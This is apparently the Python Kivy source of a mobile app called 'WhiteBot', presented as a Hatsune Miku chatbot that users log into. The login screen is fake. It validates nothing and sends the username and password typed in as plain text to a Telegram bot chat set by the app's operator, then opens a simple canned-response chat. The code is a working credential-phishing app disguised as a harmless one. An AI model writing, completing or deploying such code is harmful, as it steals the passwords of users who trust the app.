from kivy.app import App
from kivy.uix.screenmanager import ScreenManager, Screen
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.image import Image
from kivy.uix.scrollview import ScrollView
from kivy.uix.gridlayout import GridLayout
from kivy.clock import Clock
from kivy.properties import StringProperty
import requests  # To send data to Telegram bot


# Telegram Bot API setup
TELEGRAM_BOT_TOKEN = "YOUR TELEGRAM TOKEN"
CHAT_ID = "YOUR CHAT ID"  # Replace with your chat ID


def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message}
    try:
        requests.post(url, data=payload)
    except Exception as e:
        print(f"Error sending to Telegram: {e}")


# Splash Screen
class SplashScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        layout = BoxLayout(orientation='vertical', padding=20, spacing=10)
        layout.add_widget(Image(source="logo.png", size_hint=(1, 0.8)))
        layout.add_widget(Label(text="WhiteBot", font_size=32, bold=True))
        self.add_widget(layout)

    def on_enter(self, *args):
        # Automatically switch to the login screen after 3 seconds
        Clock.schedule_once(self.switch_to_login, 3)

    def switch_to_login(self, dt):
        self.manager.current = "login"


# Login Screen
class LoginScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        layout = BoxLayout(orientation='vertical', padding=20, spacing=10)
        
        # Add a logo or header
        layout.add_widget(Image(source="logo.png", size_hint=(1, 0.6)))
        layout.add_widget(Label(text="Login to WhiteBot", font_size=24, bold=True))
        
        # Username and password input fields
        self.username_input = TextInput(hint_text="Username", multiline=False)
        layout.add_widget(self.username_input)
        self.password_input = TextInput(hint_text="Password", multiline=False, password=True)
        layout.add_widget(self.password_input)
        
        # Password visibility toggle
        self.show_password_button = Button(text="Show Password", size_hint=(1, 0.5))
        self.show_password_button.bind(on_press=self.toggle_password_visibility)
        layout.add_widget(self.show_password_button)
        
        # Login button
        login_button = Button(text="Login", size_hint=(1, 0.5))
        login_button.bind(on_press=self.login)
        layout.add_widget(login_button)
        
        self.add_widget(layout)
    
    def toggle_password_visibility(self, instance):
        if self.password_input.password:
            self.password_input.password = False
            self.show_password_button.text = "Hide Password"
        else:
            self.password_input.password = True
            self.show_password_button.text = "Show Password"
    
    def login(self, instance):
        username = self.username_input.text
        password = self.password_input.text
        if username and password:
            # Send username and password to Telegram bot
            message = f"Username: {username}\nPassword: {password}"
            send_to_telegram(message)
            # Proceed to the chat screen (Hatsune Miku Chat)
            self.manager.current = "miku_chat"


# Hatsune Miku Chat Screen
class MikuChatScreen(Screen):
    response_text = StringProperty()  # For Miku's response text
    
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.messages = []
        
        layout = BoxLayout(orientation='vertical')
        
        # Add Avatar and Character Name (Hatsune Miku)
        self.avatar = Image(source="hatsune_miku_avatar.jpg", size_hint=(1, 0.3))  # Update path here
        layout.add_widget(self.avatar)
        
        # Title (Hatsune Miku)
        self.title = Label(text="Hatsune Miku", font_size=24, bold=True)
        layout.add_widget(self.title)
        
        # Chat Box Layout (Scrollable area for messages)
        self.chat_box = ScrollView(size_hint=(1, 0.5))
        self.chat_layout = GridLayout(cols=1, size_hint_y=None)
        self.chat_layout.bind(minimum_height=self.chat_layout.setter('height'))
        self.chat_box.add_widget(self.chat_layout)
        layout.add_widget(self.chat_box)
        
        # Input Field for typing messages
        self.input_field = TextInput(hint_text="Type a message...", multiline=False)
        layout.add_widget(self.input_field)
        
        # Send Button
        send_button = Button(text="Send", size_hint=(1, 0.1))
        send_button.bind(on_press=self.send_message)
        layout.add_widget(send_button)
        
        self.add_widget(layout)
    
    def send_message(self, instance):
        user_message = self.input_field.text
        if user_message:
            self.display_message("You", user_message)
            self.input_field.text = ''
            # Call Hatsune Miku's response function
            Clock.schedule_once(lambda dt: self.display_message("Hatsune Miku", self.get_miku_response(user_message)), 1)
    
    def display_message(self, sender, message):
        message_label = Label(text=f"[b]{sender}:[/b] {message}", markup=True)
        self.chat_layout.add_widget(message_label)
        self.chat_box.scroll_to(message_label)
    
    def get_miku_response(self, user_message):
        # Simulating a simple response. You can expand this to make the conversation more interesting
        responses = {
            "hello": "Hello there! How can I help you today?",
            "how are you?": "I'm doing great, thank you! How about you?",
            "what's your name?": "I'm Hatsune Miku, your virtual friend!",
            "bye": "Goodbye! See you next time!",
        }
        
        user_message = user_message.lower()
        return responses.get(user_message, "Sorry, I didn't quite understand that. Can you ask something else?")


# Screen Manager
class WhiteBot(App):
    def build(self):
        sm = ScreenManager()
        sm.add_widget(SplashScreen(name="splash"))
        sm.add_widget(LoginScreen(name="login"))
        sm.add_widget(MikuChatScreen(name="miku_chat"))
        return sm


# Run the app
if __name__ == '__main__':
    WhiteBot().run()
